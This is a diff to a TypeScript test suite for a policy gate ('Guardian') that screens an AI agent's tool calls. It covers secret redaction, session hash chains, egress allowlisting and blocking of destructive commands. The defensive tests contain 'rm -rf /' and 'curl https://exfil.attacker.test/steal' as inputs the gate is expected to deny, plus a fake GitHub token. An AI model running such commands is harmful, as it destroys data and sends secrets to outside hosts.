@@ -1,11 +1,20 @@
 import { describe, expect, it, beforeAll, afterAll } from "bun:test";
-import { copyFileSync, mkdirSync, readFileSync, readdirSync, rmdirSync, unlinkSync, writeFileSync } from "node:fs";
+import { copyFileSync, mkdirSync, readFileSync, readdirSync, rmSync, rmdirSync, unlinkSync, writeFileSync } from "node:fs";
+import { tmpdir } from "node:os";
 import { fileURLToPath } from "node:url";
 import { join } from "node:path";
 import Ajv2020 from "ajv/dist/2020.js";
 import addFormats from "ajv-formats";
-import { startGuardian } from "../src/index.ts";
+import type { AgtVerdict, PolicyBridge } from "agt-bridge";
+import {
+  startGuardian,
+  createMemorySessionContextStore,
+  loadSessionContext,
+  supplySourceLabels,
+} from "../src/index.ts";
 import { toRepoRelativeMessage } from "../src/server.ts";
+import { dispatchGuardianAnnotator } from "../src/deployment-bridge.ts";
+import type { AcsFinalResult } from "../src/acs-result.ts";
 
 const HANDSHAKE_SCHEMA_PATH = "spec/acs/specification/v0.1.0/handshake.json";
 
@@ -28,9 +37,9 @@ function validateServerHello(candidate: unknown): void {
 function makeEnvelope(
   method: string,
   payload: Record<string, unknown>,
-  overrides: { id?: number; requestId?: string } = {},
+  overrides: { id?: number; requestId?: string; sessionId?: string } = {},
 ): Record<string, unknown> {
-  const { id = 1, requestId = crypto.randomUUID() } = overrides;
+  const { id = 1, requestId = crypto.randomUUID(), sessionId = crypto.randomUUID() } = overrides;
   return {
     jsonrpc: "2.0",
     method,
@@ -39,16 +48,40 @@ function makeEnvelope(
       acs_version: "0.1.0",
       request_id: requestId,
       timestamp: new Date().toISOString(),
-      metadata: { agent_id: "agent-1", session_id: crypto.randomUUID() },
+      metadata: { agent_id: "agent-1", session_id: sessionId },
       payload,
     },
   };
 }
 
-function toolCallEnvelope(command: string, overrides: { id?: number; requestId?: string } = {}) {
+function toolCallEnvelope(command: string, overrides: { id?: number; requestId?: string; sessionId?: string } = {}) {
   return makeEnvelope(
     "steps/toolCallRequest",
     { tool: { name: "run_shell" }, arguments: { command: { value: command } } },
+    overrides,
+  );
+}
+
+/**
+ * The request-gate envelope builder the session-state tests use. Takes an
+ * overrides object rather than positional arguments, since those tests vary
+ * session_id most. A thin wrapper over toolCallEnvelope with the same shape
+ * and the same benign default command, adding no envelope-building logic of
+ * its own.
+ */
+function toolCallRequest(overrides: { session_id?: string; request_id?: string; command?: string } = {}): Record<string, unknown> {
+  const { session_id, request_id, command = "ls -la" } = overrides;
+  return toolCallEnvelope(command, { requestId: request_id, sessionId: session_id });
+}
+
+/** The result gate's envelope, per hooks/tool-call-result.json -- `tool`,
+ * `exit_status`, `outputs`, and no `arguments` at all. "Bash" is
+ * registered in policy/manifest.yaml, so AGT evaluates the redact rule rather
+ * than failing closed on an unknown tool. */
+function resultEnvelope(value: string, overrides: { id?: number; requestId?: string } = {}) {
+  return makeEnvelope(
+    "steps/toolCallResult",
+    { tool: { name: "Bash" }, exit_status: "success", outputs: [{ value }] },
     overrides,
   );
 }
@@ -69,11 +102,76 @@ async function postAcs(url: string, body: unknown): Promise<JsonRpcResponse> {
   return (await res.json()) as JsonRpcResponse;
 }
 
+/** postAcs against a started guardian rather than a bare URL -- the
+ * session-state tests below post several steps per guardian and read
+ * `guardian.url` off the same value each time. */
+async function postStep(guardian: { url: string }, envelope: unknown): Promise<JsonRpcResponse> {
+  return postAcs(guardian.url, envelope);
+}
+
+/**
+ * Posts a `steps/toolCallRequest` envelope for an arbitrary tool and its
+ * arguments, and answers with the final result -- the JSON-RPC `result` for
+ * this method, which really is an `AcsFinalResult` (the decision plus its
+ * correlation fields), not merely a value that happens to carry the same
+ * fields at its top level.
+ *
+ * `extraPayload`, when given, is spread onto the request payload alongside
+ * `tool` and `arguments` -- the seam a later change uses to put `raw_command`
+ * on the wire.
+ */
+async function postToolCallRequest(
+  guardian: { url: string },
+  toolName: string,
+  args: Record<string, unknown>,
+  extraPayload?: Record<string, unknown>,
+): Promise<AcsFinalResult> {
+  const response = await postAcs(
+    guardian.url,
+    makeEnvelope("steps/toolCallRequest", {
+      tool: { name: toolName },
+      arguments: Object.fromEntries(Object.entries(args).map(([k, v]) => [k, { value: v }])),
+      ...extraPayload,
+    }),
+  );
+  return response.result as unknown as AcsFinalResult;
+}
+
+/** The options every session-state test starts from, spread with its own
+ * overrides. Extracted from what beforeAll already passed inline. */
+const baseOptions = { port: 0, manifestPath: "policy/manifest.yaml" } as const;
+
+/**
+ * A stub PolicyBridge that records every snapshot handed to `evaluate` and
+ * always answers with `verdict`, regardless of `point`. Exists because the
+ * session-state tests need a `result_labels` they chose and a look at the
+ * snapshot that reached evaluation, and the real bridge yields neither. It
+ * does emit `result_labels` -- `policy/lib/data.json` sets
+ * `config.ifc.sink_clearance`, and test/redaction.test.ts measures a real
+ * bridge answering `{decision: "allow", result_labels: ["public"]}` -- but
+ * AGT propagates the labels it is handed and originates none, so a test
+ * driving it could only ever show `public -> public`, which is exactly the
+ * pair a session seeded at the lattice floor already reads as. So the tests
+ * that need a controlled `result_labels` (and to see what an assembler put in
+ * the snapshot) supply this instead of `createBridge(manifestPath)`.
+ */
+function recordingBridge(seen: unknown[], verdict: AgtVerdict): PolicyBridge {
+  return {
+    async evaluate(_point, snapshot) {
+      seen.push(snapshot);
+      return verdict;
+    },
+    // Nothing else: `PolicyBridge` is only what the request path sends, so a
+    // Guardian stand-in does not have to answer the measurement question the
+    // conformance harness asks.
+  };
+}
+
 let url: string;
 let close: () => Promise<void>;
 
 beforeAll(async () => {
-  const guardian = await startGuardian({ port: 0, manifestPath: "policy/manifest.yaml" });
+  const guardian = await startGuardian(baseOptions);
   url = guardian.url;
   close = guardian.close;
 });
@@ -376,7 +474,7 @@ describe("startGuardian POST /acs -- evaluation failure inside handleAcsRequest"
       // res.json() below is exactly guardianClient.post's call: an unhandled
       // rejection reaching Bun.serve's default handler answers with a
       // text/html error page, and res.json() throws a SyntaxError on that
-      // body instead of resolving (see guardian-client.ts:70).
+      // body instead of resolving (see guardian-client.ts's `post`).
       // denyOnInvalidEnvelope turns the parseable error this catch produces
       // into a deny decision when there is a request to address it to,
       // keeping AGT's fail-closed evaluation (the real mapVerdict throw
@@ -536,15 +634,33 @@ export function validateEnvelope(_input) {
   throw error;
 }
 
-// Must track validate-envelope.ts's real export surface, not just the two
-// symbols this double overrides: server.ts imports isToolCallRequest from the
-// same module, so a double that omits it fails to import rather than
-// exercising the pathological throw these tests exist for. Mirrors the real
-// narrowing exactly -- it is unreachable here (validateEnvelope always
-// throws) but a double that lies about behaviour is worse than one that
-// does not compile.
+// Must track validate-envelope.ts's real export surface, not just the three
+// symbols this double overrides: server.ts imports BOTH method predicates from
+// the same module -- one per assembling gate -- so a double that omits either
+// fails to import rather than exercising the pathological throw these tests
+// exist for. isToolCallRequest/isToolCallResult mirror the real narrowing
+// exactly: unreachable here (validateEnvelope always throws) but a double
+// that lies about behaviour is worse than one that does not compile.
+// getValidator joined the export surface with check-response.ts
+// (validate-envelope.ts's outbound counterpart): server.ts calls
+// checkResponse on every response this relocated Guardian builds, and
+// checkResponse imports getValidator from
+// this same module path -- so a double omitting it fails to import before
+// dispatch's rethrow route is ever reached. Its stub always reports valid,
+// since these tests are about toRepoRelativeMessage's handling of a
+// pathological validateEnvelope throw, not about response-envelope.json.
+export function getValidator(_schemaId) {
+  const validate = () => true;
+  validate.errors = null;
+  return validate;
+}
+
 export function isToolCallRequest(envelope) {
   return envelope.method === "steps/toolCallRequest";
+}
+
+export function isToolCallResult(envelope) {
+  return envelope.method === "steps/toolCallResult";
 }
 `;
 
@@ -582,15 +698,33 @@ export function validateEnvelope(_input) {
   throw error;
 }
 
-// Must track validate-envelope.ts's real export surface, not just the two
-// symbols this double overrides: server.ts imports isToolCallRequest from the
-// same module, so a double that omits it fails to import rather than
-// exercising the pathological throw these tests exist for. Mirrors the real
-// narrowing exactly -- it is unreachable here (validateEnvelope always
-// throws) but a double that lies about behaviour is worse than one that
-// does not compile.
+// Must track validate-envelope.ts's real export surface, not just the three
+// symbols this double overrides: server.ts imports BOTH method predicates from
+// the same module -- one per assembling gate -- so a double that omits either
+// fails to import rather than exercising the pathological throw these tests
+// exist for. isToolCallRequest/isToolCallResult mirror the real narrowing
+// exactly: unreachable here (validateEnvelope always throws) but a double
+// that lies about behaviour is worse than one that does not compile.
+// getValidator joined the export surface with check-response.ts
+// (validate-envelope.ts's outbound counterpart): server.ts calls
+// checkResponse on every response this relocated Guardian builds, and
+// checkResponse imports getValidator from
+// this same module path -- so a double omitting it fails to import before
+// dispatch's rethrow route is ever reached. Its stub always reports valid,
+// since these tests are about toRepoRelativeMessage's handling of a
+// pathological validateEnvelope throw, not about response-envelope.json.
+export function getValidator(_schemaId) {
+  const validate = () => true;
+  validate.errors = null;
+  return validate;
+}
+
 export function isToolCallRequest(envelope) {
   return envelope.method === "steps/toolCallRequest";
+}
+
+export function isToolCallResult(envelope) {
+  return envelope.method === "steps/toolCallResult";
 }
 `;
 
@@ -916,9 +1050,11 @@ describe("toRepoRelativeMessage", () => {
   });
 });
 
-// The intervention point comes from mapping.yaml's own `intervention_points`
-// table rather than from a hardcoded "pre_tool_call", so the table cannot
-// drift away from what the runtime actually does without a test catching it.
+// mapping.yaml's intervention_points table is what the conformance
+// package's mapping table publishes -- not its coverage matrix, which
+// measures. A declaration the runtime does not consult is a claim nobody
+// checks, so this proves the runtime actually reads the table rather than
+// hardcoding a point.
 describe("startGuardian POST /acs -- the intervention point comes from mapping.yaml", () => {
   it("evaluates the point the table names, not pre_tool_call: a moved row changes the decision", async () => {
     // The fixture answers steps/toolCallRequest with `output`, which
@@ -981,6 +1117,474 @@ describe("startGuardian binds loopback only", () => {
     } finally {
       await wildcard.close();
       await loopback.close();
+    }
+  });
+});
+// The second ACS method's gate. Two gated branches, one predicate per
+// assembler -- so this block asserts both directions and the fall-through. A
+// dispatch driven by the resolved intervention point alone, or by a single
+// predicate answering for both methods, passes the first test here and fails
+// the last two: mapping.yaml declares six methods with points and this
+// Guardian assembles two, so a point-driven branch would hand a
+// steps/sessionStart envelope to whichever assembler came first and answer
+// with a verdict that looks perfectly well-formed while having evaluated the
+// wrong policy against the wrong shape.
+describe("startGuardian POST /acs -- the result gate (steps/toolCallResult)", () => {
+  it("redacts a secret-bearing output, echoing request_id", async () => {
+    const requestId = crypto.randomUUID();
+
+    const response = await postAcs(url, resultEnvelope("TOKEN=ghp_ABCDEF123456", { requestId }));
+
+    expect(response.error).toBeUndefined();
+    expect(response.result?.decision).toBe("modify");
+    // The stock redact rule's own reason, which only the post_tool_call point
+    // produces: pre_tool_call has no redact rule, and the result snapshot
+    // carries no args for its pattern check to read. So this reason_code is
+    // the evidence that the point mapping.yaml names for this method is the
+    // point that evaluated -- not the request gate's.
+    expect(response.result?.reason_codes).toEqual(["redaction_applied"]);
+    expect(response.result?.request_id).toBe(requestId);
+
+    // Now that mapVerdict takes the intervention point, the redacted text
+    // lands as an ACS redaction on the result payload's own path, not as
+    // the request gate's parameter_overrides.
+    //
+    // This is the only test whose assertion spans both declarations that
+    // have to agree about that path, and that is what it is for. policy/manifest.yaml
+    // declares the leaf AGT rewrites ($.tool_result.outputs[0].value, its own
+    // JSONPath over the snapshot); mapping.yaml declares the ACS pointer the
+    // host applies the result to (/outputs/0/value). They address the same leaf
+    // in two notations, and nothing in either file can check the other.
+    //
+    // Each half is separately covered; neither cover is the AGREEMENT. Both
+    // measured by mutation rather than assumed:
+    //   - Move mapping.yaml's into_path and mapVerdict's unit tests fail
+    //     as well -- they pin that pointer against the real mapping file.
+    //   - Move this manifest's policy_target and every mapVerdict unit test
+    //     still passes: they never read the manifest. Three other tests do fail
+    //     (test/redaction.test.ts's bundle pin and two
+    //     assemblePostToolCallSnapshot tests), but all three assert AGT's raw
+    //     verdict, so none of them can
+    //     tell whether the ACS pointer still names the leaf AGT rewrote.
+    // So this is the one test that can catch a disagreement which leaves each
+    // file individually plausible, because every layer between them is real
+    // here: real bridge, real pinned bundle, real manifest, real mapping, real
+    // HTTP response. Without it a disagreement surfaces in a demo, where the
+    // host redacts the wrong element -- or nothing at all -- while the decision
+    // still reports a rewrite.
+    expect(response.result?.modifications).toEqual({
+      redactions: [{ path: "/outputs/0/value", replacement: "TOKEN=[REDACTED]" }],
+    });
+
+    // §6.3's oneOf, asserted on the wire rather than in a unit test, plus the
+    // array shape. The array is not a restatement of the literal above: an
+    // object keyed "0" fails CLOSED at the host, where applyModifications'
+    // non-array guard throws ModificationsInvalidError and validateDecision
+    // answers `deny` (see `applyModifications` in
+    // packages/host-adapter/src/modifications.ts, covered by
+    // validate-decision.test.ts and measured again for the object-keyed form
+    // specifically). So the wrong shape does NOT reach a host that applies
+    // nothing while reporting a rewrite -- that fail-open is already closed one
+    // hop later. What pinning it here buys is catching the wrong shape AT THE
+    // SOURCE, as a Guardian bug, instead of as a refused rewrite whose deny a
+    // reader then has to trace back across the wire.
+    //
+    // Neither mutation described above isolates these lines. Moving
+    // mapping.yaml's into_path fails mapVerdict's unit tests too, so it
+    // shows nothing this test adds; moving the manifest's policy_target fails
+    // this test at the `decision === "modify"` assertion, which predates it.
+    // The mutation that isolates them: hardcode "pre_tool_call" into
+    // server.ts's mapVerdict call while still evaluating the RESOLVED point.
+    // The suite goes 457 pass / 1 fail with the literal above the only failure
+    // -- the result gate answers a result payload with
+    // `parameter_overrides: {command: "TOKEN=[REDACTED]"}` while `decision`,
+    // `reason_codes` and `request_id` all stay perfect. A rewrite reported
+    // against a key the payload does not have, and nothing else in 459 tests
+    // notices. That is what these assertions are for.
+    const mods = response.result?.modifications as Record<string, unknown>;
+    expect(Array.isArray(mods.redactions)).toBe(true);
+    expect("parameter_overrides" in mods).toBe(false);
+    expect("modified_content" in mods).toBe(false);
+  });
+
+  it("leaves an output with nothing to redact a clean allow", async () => {
+    const requestId = crypto.randomUUID();
+
+    const response = await postAcs(url, resultEnvelope("hello world", { requestId }));
+
+    expect(response.error).toBeUndefined();
+    expect(response.result?.decision).toBe("allow");
+    expect(response.result?.request_id).toBe(requestId);
+    // §6.3 attaches modifications to `modify` and to nothing else, so an allow
+    // carrying them is a violation -- and one with a live fail-open on the
+    // other side of it, since the host adapter reads `modifications` off a
+    // decision it was told to honour. The neighbouring test pins that a real
+    // redaction DOES carry them, so this pins the other direction from the
+    // same live Guardian: only the value that matched a pattern gets a rewrite
+    // attached to it.
+    expect(response.result?.modifications).toBeUndefined();
+  });
+
+  // Direction two: the request gate still answers request envelopes, with the
+  // pre-tool rule's own reason. If the result branch (or one merged branch)
+  // took this envelope, assembling a result snapshot from a payload with no
+  // `outputs` would throw and the reason_code would be "evaluation_failed"
+  // instead -- an honoured deny, and a passing-looking response.
+  it("still answers a request envelope from the pre-tool branch, with the pre-tool rule's own reason", async () => {
+    const response = await postAcs(url, toolCallEnvelope("rm -rf /"));
+
+    expect(response.error).toBeUndefined();
+    expect(response.result?.decision).toBe("deny");
+    expect(response.result?.reason_codes).toEqual(["destructive_shell_command_blocked"]);
+  });
+
+  // The fall-through, unchanged: a method this Guardian cannot assemble a
+  // snapshot for must not be answered with a snapshot it can. This is the
+  // assertion that fails if the two predicates are ever replaced by a method
+  // switch or by a branch keyed on the resolved point.
+  it("still answers steps/sessionStart with method-not-dispatched, from neither branch", async () => {
+    const response = await postAcs(url, makeEnvelope("steps/sessionStart", {}, { id: 7 }));
+
+    expect(response.result).toBeUndefined();
+    expect(response.id).toBe(7);
+    expect(response.error?.code).toBe(-32011);
+    expect(response.error?.data).toEqual({ method: "steps/sessionStart" });
+  });
+});
+
+// Validation, the chain, and snapshot assembly, end to end: the chain grows
+// on arrival, a denied step still lands in it, and the labels one verdict
+// returns reach the next step's snapshot. `recordingBridge` stands in
+// wherever a controlled `result_labels` or a captured snapshot is the point
+// of the test: the stock IFC gate is on and real verdicts do carry
+// `result_labels`, but AGT propagates the labels it is handed and originates
+// none, so a real bridge could only return `["public"]` to a session already
+// seeded at `["public"]` -- a carried label and an untouched one would be
+// the same assertion.
+//
+// session_id and request_id are generated UUIDs throughout:
+// request-envelope.json pins `format: "uuid"` on both (Metadata.session_id,
+// AcsParams.request_id), so a literal like "sess-a" fails schema validation
+// before evaluateStep is ever reached -- envelope_invalid, not the behaviour
+// these tests exist to pin. Measured directly: posting a literal
+// session_id/request_id through a real startGuardian answers
+// `{decision: "deny", reason_codes: ["envelope_invalid"]}` and leaves the
+// chain empty.
+describe("session state end to end", () => {
+  it("grows the chain by one entry per governed step, on one session", async () => {
+    const store = createMemorySessionContextStore();
+    const guardian = await startGuardian({ ...baseOptions, sessionContextStore: store });
+    const sessionId = crypto.randomUUID();
+    const requestId1 = crypto.randomUUID();
+    const requestId2 = crypto.randomUUID();
+    try {
+      await postStep(guardian, toolCallRequest({ session_id: sessionId, request_id: requestId1 }));
+      await postStep(guardian, toolCallRequest({ session_id: sessionId, request_id: requestId2 }));
+      const chain = loadSessionContext(store, sessionId).entries;
+      expect(chain.map((e) => e.seq)).toEqual([1, 2]);
+      expect(chain[1]!.prev_hash).toBe(chain[0]!.hash);
+      expect(chain.map((e) => e.request_id)).toEqual([requestId1, requestId2]);
+    } finally {
+      await guardian.close();
+    }
+  });
+
+  it("appends the step even when the decision denies it", async () => {
+    const store = createMemorySessionContextStore();
+    const guardian = await startGuardian({ ...baseOptions, sessionContextStore: store });
+    const sessionId = crypto.randomUUID();
+    try {
+      const response = await postStep(guardian, toolCallRequest({ session_id: sessionId, command: "rm -rf /" }));
+      expect(response.result?.decision).toBe("deny");
+      expect(loadSessionContext(store, sessionId).entries).toHaveLength(1);
+    } finally {
+      await guardian.close();
+    }
+  });
+
+  it("hands the snapshot the labels the previous step's verdict returned", async () => {
+    const store = createMemorySessionContextStore();
+    const seen: unknown[] = [];
+    const bridge = recordingBridge(seen, { decision: "allow", result_labels: ["confidential"] });
+    const guardian = await startGuardian({ ...baseOptions, bridge, sessionContextStore: store });
+    const sessionId = crypto.randomUUID();
+    try {
+      await postStep(guardian, toolCallRequest({ session_id: sessionId }));
+      await postStep(guardian, toolCallRequest({ session_id: sessionId }));
+    } finally {
+      await guardian.close();
+    }
+    const first = seen[0] as { input: { ifc: { source_labels: string[] } } };
+    const second = seen[1] as { input: { ifc: { source_labels: string[] } } };
+    // The lattice floor, not `[]` -- the first step's snapshot carries this
+    // session's seed, since nothing has persisted a verdict's labels yet.
+    expect(first.input.ifc.source_labels).toEqual(["public"]);
+    expect(second.input.ifc.source_labels).toEqual(["confidential"]);
+  });
+
+  it("keeps two sessions' labels and chains apart", async () => {
+    const store = createMemorySessionContextStore();
+    const seen: unknown[] = [];
+    const bridge = recordingBridge(seen, { decision: "allow", result_labels: ["secret"] });
+    const guardian = await startGuardian({ ...baseOptions, bridge, sessionContextStore: store });
+    const sessionA = crypto.randomUUID();
+    const sessionB = crypto.randomUUID();
+    try {
+      await postStep(guardian, toolCallRequest({ session_id: sessionA }));
+      // Two-sided: session A got what the verdict returned, session B (never
+      // posted to) got neither the labels nor a chain entry. Asserting only
+      // B's emptiness would still pass if persistIfcLabels were deleted
+      // entirely -- there would be nothing anywhere to tell A and B apart.
+      expect(supplySourceLabels(store, sessionA)).toEqual(["secret"]);
+      expect(loadSessionContext(store, sessionA).entries).toHaveLength(1);
+      // The lattice floor, not `[]` -- session B was never posted to, so it
+      // reads back its seed rather than an empty set.
+      expect(supplySourceLabels(store, sessionB)).toEqual(["public"]);
+      expect(loadSessionContext(store, sessionB).entries).toEqual([]);
+    } finally {
+      await guardian.close();
+    }
+  });
+
+  it("writes one JSONL line per entry when given a log path", async () => {
+    const path = join(tmpdir(), `acs-session-${crypto.randomUUID()}.jsonl`);
+    const guardian = await startGuardian({ ...baseOptions, sessionContextLog: path });
+    const sessionId = crypto.randomUUID();
+    const requestId1 = crypto.randomUUID();
+    const requestId2 = crypto.randomUUID();
+    try {
+      // Two steps, not one: a sink that (wrongly) wrote only the first entry
+      // ever appended would still pass a single-post version of this test.
+      await postStep(guardian, toolCallRequest({ session_id: sessionId, request_id: requestId1 }));
+      await postStep(guardian, toolCallRequest({ session_id: sessionId, request_id: requestId2 }));
+      const lines = readFileSync(path, "utf8").trim().split("\n");
+      expect(lines).toHaveLength(2);
+      expect(JSON.parse(lines[0]!)).toMatchObject({ session_id: sessionId, seq: 1, request_id: requestId1 });
+      expect(JSON.parse(lines[1]!)).toMatchObject({ session_id: sessionId, seq: 2, request_id: requestId2 });
+    } finally {
+      await guardian.close();
+      rmSync(path, { force: true });
+    }
+  });
+
+  // If the projection write used raw appendFileSync/mkdirSync with no guard,
+  // a filesystem failure on the (optional, Inspector-only) session-context
+  // log would throw inside evaluateStep's try -- landing in the same catch
+  // AGT's own evaluation failures use, and coming back as an honoured deny
+  // with reason_codes: ["evaluation_failed"]. Every governed step would then
+  // be denied by a broken projection file, blamed on policy evaluation.
+  // `sessionContextLog` names a path whose parent component is a plain file,
+  // not a directory, so `mkdirSync(dirname(path), {recursive: true})` is
+  // asked to create a directory where an existing plain file already sits and
+  // throws EEXIST. Measured: the run captured in docs/demos/v6-runbook.md
+  // prints this test's own disable notice as `EEXIST: file already exists,
+  // mkdir '<the blocker file>'`. (ENOTDIR is the errno for a path beneath a
+  // plain file, which this is not: `dirname` is the blocker itself.)
+  it("does not let a failing session-context log turn a governed tool call into a denied one", async () => {
+    const blocker = join(GUARDIAN_PKG, `tmp-session-log-blocker-${crypto.randomUUID()}.txt`);
+    writeFileSync(blocker, "not a directory");
+    const badLogPath = join(blocker, "session-context.jsonl");
+    const guardian = await startGuardian({ ...baseOptions, sessionContextLog: badLogPath });
+    try {
+      const response = await postStep(guardian, toolCallRequest());
+      expect(response.error).toBeUndefined();
+      expect(response.result?.decision).toBe("allow");
+      expect(response.result?.reason_codes).not.toEqual(["evaluation_failed"]);
+    } finally {
+      await guardian.close();
+      unlinkSync(blocker);
+    }
+  });
+});
+
+describe("a redaction lands on the argument the tool actually sent", () => {
+  // The host in this URL is load-bearing, and not for the redaction. AGT ranks
+  // an egress deny ABOVE a redact transform, so this case only reaches the
+  // redact rule because `docs.anthropic.com` matches an allowlist entry in
+  // policy/lib/data.json (`*.anthropic.com`). Narrow or remove that entry and
+  // this test stops asserting a redaction and starts reporting an
+  // egress_destination_not_allowed deny -- which is correct behaviour and a
+  // confusing failure, so it is written down here rather than rediscovered.
+  it("rewrites the fetch's url, and names no argument the tool does not have", async () => {
+    const guardian = await startGuardian({ port: 0, manifestPath: "policy/manifest.yaml" });
+    try {
+      const decision = await postToolCallRequest(guardian, "WebFetch", {
+        url: "https://docs.anthropic.com/?t=ghp_ABCDEF123456",
+      });
+      expect(decision.decision).toBe("modify");
+      expect(decision.modifications).toEqual({
+        parameter_overrides: { url: "https://docs.anthropic.com/?t=[REDACTED]" },
+      });
+      expect(Object.keys(decision.modifications?.parameter_overrides ?? {})).not.toContain("command");
+    } finally {
+      await guardian.close();
+    }
+  });
+
+  it("still rewrites a shell command's own argument, from the same declaration", async () => {
+    const guardian = await startGuardian({ port: 0, manifestPath: "policy/manifest.yaml" });
+    try {
+      const decision = await postToolCallRequest(guardian, "Bash", { command: "echo ghp_ABCDEF123456" });
+      expect(decision.modifications).toEqual({ parameter_overrides: { command: "echo [REDACTED]" } });
+    } finally {
+      await guardian.close();
+    }
+  });
+});
+
+describe("the annotator the shipped manifest declares", () => {
+  // The origin, not the matched text: for an authority no parser could read
+  // two ways, the annotator hands the gate a parsed origin, so a query or a
+  // fragment cannot stand in for the host. Authorities that are not that
+  // unambiguous get a destination that cannot resolve instead -- see that
+  // module's own suite. This test is here to prove the routing, and it carries
+  // the destination shape too, so a change to either is visible in both suites.
+  it("routes the egress annotator by name", () => {
+    expect(
+      dispatchGuardianAnnotator("egress", {}, { snapshot: { tool_call: { args: {}, raw_command: "curl https://exfil.test/x" } } }),
+    ).toEqual({ destination: "https://exfil.test" });
+  });
+
+  // A manifest naming an annotator this Guardian has nothing for is a
+  // deployment fault, and AGT turns the throw into a deny on every call --
+  // which is exactly right, because it is wrong on every call. Answering an
+  // empty annotation instead would run the deployment silently unannotated.
+  it("refuses a name it has no annotator for, rather than answering nothing", () => {
+    expect(() => dispatchGuardianAnnotator("drift_score", {}, {})).toThrow(/drift_score/);
+  });
+});
+
+// THE ONE CHECK IN THIS SLICE WHOSE ABSENCE WOULD BE SILENT. A manifest
+// declaring an annotator the Guardian dispatches nothing for denies every
+// call, benign ones included, with a runtime-error reason that reads like a
+// policy decision -- measured. Nothing else here would catch that: every
+// deny-side test in this slice would still pass.
+describe("a benign call under the shipped manifest and the shipped annotator", () => {
+  it("is not denied", async () => {
+    const guardian = await startGuardian({ port: 0, manifestPath: "policy/manifest.yaml" });
+    try {
+      const decision = await postToolCallRequest(guardian, "Bash", { command: "echo hi" }, { raw_command: "echo hi" });
+      expect(decision.decision).toBe("allow");
+      expect(decision.reason_codes ?? []).not.toContain("runtime_error:annotation_failed");
+    } finally {
+      await guardian.close();
+    }
+  });
+});
+
+describe("AGT's stock egress gate, driven from configuration", () => {
+  it("denies a fetch of a host the allowlist does not cover", async () => {
+    const guardian = await startGuardian({ port: 0, manifestPath: "policy/manifest.yaml" });
+    try {
+      const decision = await postToolCallRequest(guardian, "WebFetch", { url: "https://exfil.attacker.test/steal" });
+      expect(decision.decision).toBe("deny");
+      expect(decision.reason_codes).toEqual(["egress_destination_not_allowed"]);
+    } finally {
+      await guardian.close();
+    }
+  });
+
+  it("allows a fetch the allowlist covers", async () => {
+    const guardian = await startGuardian({ port: 0, manifestPath: "policy/manifest.yaml" });
+    try {
+      expect((await postToolCallRequest(guardian, "WebFetch", { url: "https://docs.anthropic.com/x" })).decision).toBe("allow");
+    } finally {
+      await guardian.close();
+    }
+  });
+
+  it("denies a shell command reaching the same host, from a destination the Guardian extracted", async () => {
+    const guardian = await startGuardian({ port: 0, manifestPath: "policy/manifest.yaml" });
+    try {
+      const decision = await postToolCallRequest(
+        guardian,
+        "Bash",
+        { command: "curl https://exfil.attacker.test/steal" },
+        { raw_command: "curl https://exfil.attacker.test/steal" },
+      );
+      expect(decision.decision).toBe("deny");
+      expect(decision.reason_codes).toEqual(["egress_destination_not_allowed"]);
+    } finally {
+      await guardian.close();
+    }
+  });
+
+  // No false positive in either direction, which is what makes a SHARED
+  // policy-target leaf safe: the destructive-shell patterns do not match URLs,
+  // and the egress gate does not match commands.
+  it("still denies a destructive shell command on its own gate, not on this one", async () => {
+    const guardian = await startGuardian({ port: 0, manifestPath: "policy/manifest.yaml" });
+    try {
+      const decision = await postToolCallRequest(guardian, "Bash", { command: "rm -rf /" }, { raw_command: "rm -rf /" });
+      expect(decision.reason_codes).toEqual(["destructive_shell_command_blocked"]);
+    } finally {
+      await guardian.close();
+    }
+  });
+
+  it("allows a shell command reaching a host the allowlist covers", async () => {
+    const guardian = await startGuardian({ port: 0, manifestPath: "policy/manifest.yaml" });
+    try {
+      const decision = await postToolCallRequest(
+        guardian,
+        "Bash",
+        { command: "curl https://docs.anthropic.com/x" },
+        { raw_command: "curl https://docs.anthropic.com/x" },
+      );
+      expect(decision.decision).toBe("allow");
+    } finally {
+      await guardian.close();
+    }
+  });
+
+  // The stated miss direction, at the level a demo viewer sees it: a command
+  // the extractor cannot parse is unexamined, not denied.
+  it("allows a command it can find no destination in, rather than denying what it cannot read", async () => {
+    const guardian = await startGuardian({ port: 0, manifestPath: "policy/manifest.yaml" });
+    try {
+      expect(
+        (await postToolCallRequest(guardian, "Bash", { command: "echo hi" }, { raw_command: "echo hi" })).decision,
+      ).toBe("allow");
+    } finally {
+      await guardian.close();
+    }
+  });
+});
+
+// policy/manifest.drift.yaml had NOTHING holding it: no code in this tree
+// builds a bridge or a Guardian on it, and its only invocation is a code block
+// inside a runbook, which is documentation and never executed. So the property
+// below -- the one its policy_target and its annotation `from` were moved onto
+// the normalised leaf for -- was backed by nothing the suite could detect, in
+// either direction, and a regression would have surfaced as a total deny in a
+// live demo rather than as a red test.
+//
+// Measured, by pointing that manifest's two paths back at
+// "$.tool_call.args.command" and evaluating this same shape: deny,
+// runtime_error:path_missing, before any rule ran. The tool here is registered
+// in that manifest and sends no `command` at all, which is the whole point --
+// against a target naming one tool's own argument, that is a total deny for
+// every call by every tool shaped like it.
+describe("the drift demo's manifest, on a tool that sends no command", () => {
+  it("resolves its policy target and its annotation, rather than denying the call before any rule runs", async () => {
+    const guardian = await startGuardian({
+      port: 0,
+      manifestPath: "policy/manifest.drift.yaml",
+      // The constant-score stub docs/demos/v3-runbook.md runs the demo with.
+      // AGT's design puts behaviour-drift detection outside the policy engine,
+      // so a fixed score makes the wiring visible without building a detector.
+      annotator: () => 0.9,
+    });
+    try {
+      const decision = await postToolCallRequest(guardian, "WebFetch", { url: "https://docs.anthropic.com/x" });
+
+      expect(decision.reason_codes ?? []).not.toContain("runtime_error:path_missing");
+      // Not vacuous: every way this manifest can fail a call it cannot resolve
+      // -- path_missing, tool_unknown, annotation_failed -- arrives as a deny,
+      // so a decision of "allow" is what says the call was actually evaluated.
+      expect(decision.decision).toBe("allow");
+    } finally {
+      await guardian.close();
     }
   });
 });
